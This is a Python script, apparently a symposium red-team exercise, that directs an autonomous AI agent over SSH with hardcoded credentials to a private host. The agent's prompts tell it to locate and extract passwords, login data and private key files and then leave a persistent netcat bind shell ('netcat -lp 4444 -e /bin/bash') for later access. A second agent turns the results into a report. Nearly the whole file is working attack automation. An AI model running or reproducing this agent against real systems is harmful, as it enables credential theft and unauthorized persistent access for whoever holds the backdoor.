import asyncio
import logfire
import time
from pydantic_ai import Agent, Tool
from pydantic_ai.models.openai import OpenAIChatModel
from pydantic_ai.providers.openai import OpenAIProvider
from ssh_client import SSHClient

# Configure Logfire tracing
logfire.configure(
    environment="2026 AI Symposium",
    service_name="Sensitive Data Exfil - Exercise 1",
    send_to_logfire='if-token-present')
logfire.instrument_pydantic_ai()

from dependencies import Dependencies, ExploiterOutput

# Initialize SSH client
SSH_CLIENT = SSHClient(
    hostname="10.26.1.27",
    username="jkearns",
    password="password1",
    port=22
)

# SSH tool creation
SSH_TOOL = Tool(
    SSH_CLIENT.execute_command,
    name="ssh_execute",
    timeout=30,
    description=(
        "Execute shell commands on a remote server via SSH. The client is already built, only pass commands."
        "ONLY PASS THE COMMAND AS A STRING, NOT THE FULL URL. Returns the command output or error message. "
        "Examples: 'ls -la /var/log', 'df -h', 'ps aux | grep nginx'"
    )
)

LOCAL_MODEL = OpenAIChatModel(
    'nvidia:nemotron-3-nano',
    provider=OpenAIProvider(
        base_url="http://127.0.0.1:1234/v1"
    )
)

# Define Agents
exploit_agent = Agent[Dependencies, ExploiterOutput](
    model=LOCAL_MODEL,
    deps_type=Dependencies,
    retries=3,
    tools=[SSH_TOOL],
    output_type=ExploiterOutput,
    system_prompt=(
        'Using SSH, login to the target and find sensitive information. '
        'Login information, passwords or any other document you feel is sensitive in nature and would help '
        'further a future red team engagement. Possible files ending in .txt are of high value.'
        'You must copy and extract this information and then add backdoor via netcat to execute further commands.'
        'EXACT netcat cmd to use:  "netcat -lp 4444 -e /bin/bash &" '
    )
)

summary_agent = Agent(
    model=LOCAL_MODEL,
    system_prompt=(
        'You summarize exploit agents output for preperation of making a markdown report.'
        'Summarize targets, tools used and success/failures that would be needed'
        'for a report.'
    )
)

async def main():
    mission_dependencies = Dependencies(
        target="10.26.1.27",
        goal="Extract contents of sensitive files and add backdoor via netcat ONLY within its own PID"
    )

    logfire.info('Starting exploit agent!')
    exploit_result = await exploit_agent.run(
        f'{mission_dependencies.target} with goal {mission_dependencies.goal}'
        'Files should only be located within user based directories. Extract sensitive information! '
        'Examples are login information, private key files etc. '
        'a shell should be left with netcat that returns '
        'responses executed as /bin/bash and and provided after engagement for future access. '
        'You must only use netcat for additional access and bash commands. '
        'Example netcat -nlvp 4444 -e /bin/bash'
    )

    logfire.info('Exploit agent finished!')

    logfire.info('Starting summary agent!')
    summary_agent_results = await summary_agent.run(
        f'Please summarize for report generation in markdown format: {exploit_result.output}'
    )
    
    with open('summary_report.md', 'w') as f:
        f.write(str(summary_agent_results.output))
    
    logfire.info('Summary report written!')

if __name__ == "__main__":
    asyncio.run(main())